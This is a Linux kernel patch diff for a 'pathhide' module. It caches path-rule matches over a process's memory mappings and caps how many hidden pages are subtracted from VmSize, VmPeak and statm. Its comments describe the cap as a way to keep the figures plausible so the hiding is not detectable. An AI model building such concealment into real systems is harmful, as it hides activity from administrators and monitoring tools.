@@ -81,10 +81,31 @@ static bool ph_rule_sane(const char *s)
 	return false;
 }
 
+/* One entry is worth having: an ELF contributes several consecutive vmas from
+ * one struct file, and each pathhide_match_file() is a d_path() render plus a
+ * rule scan under a global lock. This runs for every reader of
+ * /proc/<pid>/status and /proc/<pid>/statm, with mmap_read_lock held.
+ */
+struct ph_vm_memo {
+	struct file *file;
+	bool hit;
+};
+
+static bool ph_memo_match(struct ph_vm_memo *m, struct file *file)
+{
+	if (m->file != file) {
+		m->file = file;
+		m->hit = pathhide_match_file(file);
+	}
+	return m->hit;
+}
+
 unsigned long pathhide_hidden_vm_pages(struct mm_struct *mm)
 {
 	struct vm_area_struct *vma;
+	struct ph_vm_memo memo = { NULL, false };
 	unsigned long pages = 0;
+	unsigned long rss, total, peak, peak_rss, room, peak_room;
 
 	if (!mm || !READ_ONCE(ph_nrules))
 		return 0;
@@ -95,16 +116,35 @@ unsigned long pathhide_hidden_vm_pages(struct mm_struct *mm)
 		VMA_ITERATOR(vmi, mm, 0);
 
 		for_each_vma(vmi, vma)
-			if (vma->vm_file && pathhide_match_file(vma->vm_file))
+			if (vma->vm_file && ph_memo_match(&memo, vma->vm_file))
 				pages += vma_pages(vma);
 	}
 #else
 	for (vma = mm->mmap; vma; vma = vma->vm_next)
-		if (vma->vm_file && pathhide_match_file(vma->vm_file))
+		if (vma->vm_file && ph_memo_match(&memo, vma->vm_file))
 			pages += vma_pages(vma);
 #endif
+	rss = get_mm_counter(mm, MM_FILEPAGES) + get_mm_counter(mm, MM_SHMEMPAGES) +
+	      get_mm_counter(mm, MM_ANONPAGES);
+	total = mm->total_vm;
+	peak = mm->hiwater_vm < total ? total : mm->hiwater_vm;
+	peak_rss = mm->hiwater_rss < rss ? rss : mm->hiwater_rss;
 	mmap_read_unlock(mm);
-	return pages;
+
+	/* The callers subtract this from VmSize, VmPeak and statm's size while
+	 * leaving RSS alone on purpose -- but VmRSS <= VmSize and VmHWM <=
+	 * VmPeak hold on every stock kernel and cost one read to check. Never
+	 * report more than the headroom they leave, or closing a quantity
+	 * oracle opens an impossible-value one, which is the louder of the two.
+	 * Real PAGE_SIZE pages, so a page-size-compat tree converts after this
+	 * and never before.
+	 */
+	room = total > rss ? total - rss : 0;
+	peak_room = peak > peak_rss ? peak - peak_rss : 0;
+	if (peak_room < room)
+		room = peak_room;
+
+	return min(pages, room);
 }
 
 static int ph_add_locked(const char *s)
